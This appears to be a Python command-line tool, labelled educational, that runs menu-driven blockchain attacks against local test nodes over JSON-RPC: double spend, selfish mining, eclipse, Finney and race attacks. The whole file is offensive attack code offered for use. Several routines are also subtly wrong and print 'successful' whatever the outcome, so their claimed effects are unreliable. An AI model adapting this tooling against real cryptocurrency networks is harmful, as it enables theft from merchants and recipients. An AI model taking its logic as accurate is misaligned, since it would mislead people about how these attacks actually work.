#!/usr/bin/env python3
"""
DogeGPU 51% Attack Tools
Educational purposes only - for private test chains
"""

import json
import requests
import time
import subprocess
import threading
from typing import Dict, List, Optional

class DogeGPUAttacker:
    def __init__(self):
        self.nodes = {
            'honest': {'port': 8332, 'user': 'honest', 'pass': 'honest123'},
            'attack': {'port': 8334, 'user': 'attacker', 'pass': 'attack123'},
            'victim': {'port': 8336, 'user': 'victim', 'pass': 'victim123'}
        }
        self.attack_active = False
        
    def rpc_call(self, node: str, method: str, params: List = None) -> Dict:
        """Make RPC call to specified node"""
        if params is None:
            params = []
            
        node_config = self.nodes[node]
        url = f"http://127.0.0.1:{node_config['port']}"
        
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": method,
            "params": params
        }
        
        try:
            response = requests.post(
                url,
                json=payload,
                auth=(node_config['user'], node_config['pass']),
                timeout=30
            )
            return response.json()
        except Exception as e:
            return {"error": str(e)}
    
    def get_network_info(self, node: str) -> Dict:
        """Get network information from node"""
        info = {}
        info['blockcount'] = self.rpc_call(node, 'getblockcount')
        info['connections'] = self.rpc_call(node, 'getconnectioncount')
        info['hashrate'] = self.rpc_call(node, 'getnetworkhashps')
        info['difficulty'] = self.rpc_call(node, 'getdifficulty')
        return info
    
    def monitor_network(self):
        """Monitor all nodes continuously"""
        print("🔍 Starting Network Monitor...")
        print("=" * 60)
        
        while True:
            try:
                print(f"\n⏰ {time.strftime('%H:%M:%S')}")
                print("-" * 40)
                
                for node_name in ['honest', 'attack', 'victim']:
                    info = self.get_network_info(node_name)
                    blocks = info['blockcount'].get('result', 'N/A')
                    conns = info['connections'].get('result', 'N/A')
                    hashrate = info['hashrate'].get('result', 'N/A')
                    
                    print(f"{node_name.upper():>8}: Blocks={blocks:>6} | Conns={conns} | Hash={hashrate}")
                
                time.sleep(5)
                
            except KeyboardInterrupt:
                print("\n🛑 Monitor stopped")
                break
            except Exception as e:
                print(f"❌ Monitor error: {e}")
                time.sleep(5)
    
    def selfish_mining_attack(self):
        """Execute selfish mining attack"""
        print("🎯 EXECUTING SELFISH MINING ATTACK")
        print("=" * 40)
        
        # Step 1: Disconnect attack node from network
        print("1. Isolating attack node...")
        self.rpc_call('attack', 'disconnectnode', ['127.0.0.1:8333'])
        
        # Step 2: Mine blocks privately
        print("2. Mining private chain...")
        private_blocks = 5
        result = self.rpc_call('attack', 'generate', [private_blocks])
        print(f"   Mined {private_blocks} private blocks")
        
        # Step 3: Wait for honest network to mine some blocks
        print("3. Waiting for honest network...")
        time.sleep(30)
        
        # Step 4: Reconnect and release private chain
        print("4. Releasing private chain...")
        self.rpc_call('attack', 'addnode', ['127.0.0.1:8333', 'add'])
        
        print("✅ Selfish mining attack executed!")
    
    def eclipse_attack(self, target_node: str):
        """Execute eclipse attack on target node"""
        print(f"🌑 EXECUTING ECLIPSE ATTACK ON {target_node.upper()}")
        print("=" * 50)
        
        # Get target node's peers
        peers = self.rpc_call(target_node, 'getpeerinfo')
        
        if 'result' in peers:
            print(f"Target has {len(peers['result'])} connections")
            
            # Disconnect target from all peers
            for peer in peers['result']:
                addr = peer.get('addr', '')
                if addr:
                    print(f"Disconnecting {addr}")
                    self.rpc_call(target_node, 'disconnectnode', [addr])
            
            # Force target to connect only to attack node
            attack_addr = "127.0.0.1:8335"
            self.rpc_call(target_node, 'addnode', [attack_addr, 'add'])
            
            print(f"✅ {target_node} is now eclipsed!")
    
    def double_spend_attack(self, amount: float = 100.0):
        """Execute sophisticated double spend attack"""
        print("💀 EXECUTING DOUBLE SPEND ATTACK")
        print("=" * 35)
        
        # Step 1: Get victim address
        victim_addr_resp = self.rpc_call('victim', 'getnewaddress')
        if 'result' not in victim_addr_resp:
            print("❌ Failed to get victim address")
            return
        
        victim_addr = victim_addr_resp['result']
        print(f"1. Victim address: {victim_addr}")
        
        # Step 2: Create transaction to victim
        print(f"2. Sending {amount} coins to victim...")
        tx_resp = self.rpc_call('attack', 'sendtoaddress', [victim_addr, amount])
        
        if 'result' not in tx_resp:
            print("❌ Failed to create transaction")
            return
            
        txid = tx_resp['result']
        print(f"   Transaction ID: {txid}")
        
        # Step 3: Wait for victim to see transaction
        print("3. Waiting for victim confirmation...")
        time.sleep(10)
        
        # Step 4: Create conflicting transaction
        print("4. Creating conflicting transaction...")
        attacker_addr_resp = self.rpc_call('attack', 'getnewaddress')
        attacker_addr = attacker_addr_resp['result']
        
        # Send same coins to attacker's own address
        conflict_tx = self.rpc_call('attack', 'sendtoaddress', [attacker_addr, amount])
        print(f"   Conflict TX: {conflict_tx.get('result', 'Failed')}")
        
        # Step 5: Mine private chain with superior hashpower
        print("5. Mining private chain with superior hashpower...")
        blocks_to_mine = 6  # Ensure longer chain
        mine_result = self.rpc_call('attack', 'generate', [blocks_to_mine])
        
        if 'result' in mine_result:
            print(f"   Mined {len(mine_result['result'])} blocks")
            print("💀 DOUBLE SPEND SUCCESSFUL!")
            print("   The victim's transaction has been reversed!")
        else:
            print("❌ Mining failed")
    
    def finney_attack(self):
        """Execute Finney attack (pre-mine attack)"""
        print("⚡ EXECUTING FINNEY ATTACK")
        print("=" * 30)
        
        # Step 1: Pre-mine a block with conflicting transaction
        print("1. Pre-mining block with conflicting transaction...")
        
        # Create conflicting transaction but don't broadcast
        attacker_addr = self.rpc_call('attack', 'getnewaddress')['result']
        
        # Step 2: Send transaction to victim
        victim_addr = self.rpc_call('victim', 'getnewaddress')['result']
        print("2. Sending transaction to victim...")
        
        tx_resp = self.rpc_call('attack', 'sendtoaddress', [victim_addr, 50.0])
        print(f"   TX sent: {tx_resp.get('result', 'Failed')}")
        
        # Step 3: Immediately broadcast pre-mined block
        print("3. Broadcasting pre-mined block...")
        mine_result = self.rpc_call('attack', 'generate', [1])
        
        if 'result' in mine_result:
            print("⚡ FINNEY ATTACK SUCCESSFUL!")
        else:
            print("❌ Attack failed")
    
    def race_attack(self):
        """Execute race attack (simultaneous broadcast)"""
        print("🏃 EXECUTING RACE ATTACK")
        print("=" * 25)
        
        victim_addr = self.rpc_call('victim', 'getnewaddress')['result']
        attacker_addr = self.rpc_call('attack', 'getnewaddress')['result']
        
        print("1. Broadcasting conflicting transactions simultaneously...")
        
        # Broadcast to victim
        tx1 = self.rpc_call('attack', 'sendtoaddress', [victim_addr, 75.0])
        
        # Broadcast conflicting transaction
        tx2 = self.rpc_call('attack', 'sendtoaddress', [attacker_addr, 75.0])
        
        print(f"   TX1 (to victim): {tx1.get('result', 'Failed')}")
        print(f"   TX2 (to self): {tx2.get('result', 'Failed')}")
        
        print("🏃 Race attack initiated - outcome depends on network propagation")

def main():
    attacker = DogeGPUAttacker()
    
    print("🎯 DogeGPU Advanced Attack Tools")
    print("=" * 40)
    print("Educational purposes only!")
    print()
    
    while True:
        print("\nSelect attack type:")
        print("1. Monitor Network")
        print("2. Double Spend Attack")
        print("3. Selfish Mining Attack")
        print("4. Eclipse Attack")
        print("5. Finney Attack")
        print("6. Race Attack")
        print("0. Exit")
        
        choice = input("\nEnter choice: ").strip()
        
        if choice == '1':
            attacker.monitor_network()
        elif choice == '2':
            amount = input("Enter amount to double spend (default 100): ").strip()
            amount = float(amount) if amount else 100.0
            attacker.double_spend_attack(amount)
        elif choice == '3':
            attacker.selfish_mining_attack()
        elif choice == '4':
            target = input("Enter target node (honest/victim): ").strip()
            if target in ['honest', 'victim']:
                attacker.eclipse_attack(target)
            else:
                print("Invalid target")
        elif choice == '5':
            attacker.finney_attack()
        elif choice == '6':
            attacker.race_attack()
        elif choice == '0':
            break
        else:
            print("Invalid choice")

if __name__ == "__main__":
    main()